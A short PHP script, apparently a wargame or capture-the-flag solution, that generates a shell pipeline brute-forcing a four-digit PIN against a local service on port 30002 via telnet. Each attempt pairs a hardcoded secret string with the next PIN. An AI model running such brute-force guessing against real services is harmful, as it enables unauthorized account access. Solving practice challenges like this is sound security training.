<?php

echo '(', PHP_EOL;
for ($i = 0; $i < 10000; ++$i) {
    echo 'echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ',
        str_pad($i, 4, '0', STR_PAD_LEFT),
        '"', PHP_EOL,
        'sleep 1',
        PHP_EOL;
}
echo ') | telnet localhost 30002', PHP_EOL;
